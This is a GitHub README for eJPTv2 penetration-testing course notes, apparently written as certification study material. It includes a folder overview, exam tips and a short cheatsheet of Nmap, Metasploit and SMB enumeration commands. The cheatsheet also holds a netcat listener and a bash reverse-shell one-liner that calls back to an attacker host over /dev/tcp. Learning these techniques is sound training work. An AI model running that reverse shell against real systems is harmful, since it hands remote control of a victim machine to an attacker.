<div align="center">

![Stars](https://img.shields.io/github/stars/iChetan7/eJPTv2-Notes?style=for-the-badge&color=FF6B35)
![Last Commit](https://img.shields.io/github/last-commit/iChetan7/eJPTv2-Notes?style=for-the-badge&color=8B5CF6)
![Files](https://img.shields.io/github/directory-file-count/iChetan7/eJPTv2-Notes?style=for-the-badge&color=22C55E)
![License](https://img.shields.io/badge/License-CC_BY--NC_4.0-EF4444?style=for-the-badge)

</div>

# INE eJPT Cheat Sheet / Course Notes

---

## 🎯 Who is this for?

- You're preparing for the **eJPT v2** exam
- You learn better by **reading structured notes** than watching hours of video
- You want a **cheatsheet you can actually use** during labs and the exam
- You like notes that feel like a friend explaining it -> not a textbook

If that's you, you're in the right place.

---

## 📂 What's inside?

```
eJPTv2-Notes/
│
├── 1. Assessment Methodologies/
│   ├── 1. AM - Information Gathering/
│   ├── 2. AM - Footprinting & Scanning/
│   ├── 3. AM Enumeration/          ← SMB, FTP, SSH, HTTP, SQL
│   ├── 4. AM Vulnerability Assessment/
│   └── 5. AM Auditing Fundamental/
│
├── 2. Host & Network Penetration Testing/
│   ├── 1. System_Host Based Attacks/
│   │   ├── Windows/                ← Exploits, PrivEsc, Credential Dumping
│   │   └── Linux/                  ← Vulnerabilities, PrivEsc
│   ├── 2. Network Based Attacks/   ← Wireshark, ARP Poisoning, MITM
│   ├── 3. Metasploit Framework/    ← Full MSF coverage + Armitage
│   ├── 4. Exploitation/            ← Shells, Exploits, AV Evasion
│   ├── 5. Post-Exploitation/       ← PrivEsc, Persistence, Pivoting, Clearing Tracks
│   └── 6. Social Engineering/      ← GoPhish Lab
│
└── 3. Web Application Penetration Testing/
    └── 1. Intro to Web & HTTP/     ← Burp Suite, SQLMap, XSSer, Nikto, ZAP, Hydra
```

---

## ✍️ Why these notes are different

Most people either:
- Watch the video and do nothing → forget everything
- Find random notes online → half of it is wrong or outdated

These notes were written **while doing the labs**, so:

- Commands are copy-paste ready
- Each topic has **what it is + how to use it**
- Exam-relevant stuff is highlighted
- No fluff — straight to the point

---

## ⚡ Cheatsheet Highlights

A few things you'll find super useful during the exam:

**Quick Nmap scan:**
```bash
nmap -sV -sC -oN scan.txt <target-ip>
```

**Metasploit basics:**
```bash
msfconsole
search <exploit-name>
use <module>
set RHOSTS <ip>
run
```

**Reverse shell (Netcat):**
```bash
nc -lvnp 4444          # attacker
bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1   # victim
```

**SMB Enumeration:**
```bash
smbclient -L //<ip> -N
enum4linux -a <ip>
```

> Full cheatsheets are inside each topic folder.

---

## 🗺️ Exam Tips (from someone who studied this)

- The exam is **open book** -> use these notes during it
- Focus heavily on: **Nmap, Metasploit, SMB, FTP, HTTP enumeration**
- Know your **Meterpreter commands** cold
- Pivoting questions do come -> understand `autoroute`
- Don't overthink it -> if you did the labs, you'll pass

---

## 🛠️ Tools Covered

`Nmap` · `Metasploit / MSFvenom` · `Burp Suite` · `Wireshark` · `Netcat` · `Hydra` · `SQLMap` · `Gobuster` · `Enum4linux` · `Mimikatz` · `Bettercap` · `GoPhish` · `Nikto` · `SearchSploit` · `Aircrack-ng`

---

## 📌 How to use these notes

1. **Clone the repo**
   ```bash
   git clone https://github.com/iChetan7/eJPTv2-Notes.git
   ```
2. **Open in Obsidian** (recommended) — the notes are interlinked
3. Use the folder structure to follow along with the INE PTS course
4. Keep the cheatsheet files open during labs/exam

---

## 🙋 About

Made by **Chaitanya Shekhar** — B.Tech CSE (IoT CSBT), Galgotias University.
Actively working toward eJPT → CPTS → OSCP.

---

© 2026 (@iChetan7). Notes are shared for learning purposes.
Redistribution or republishing as your own work is not permitted.
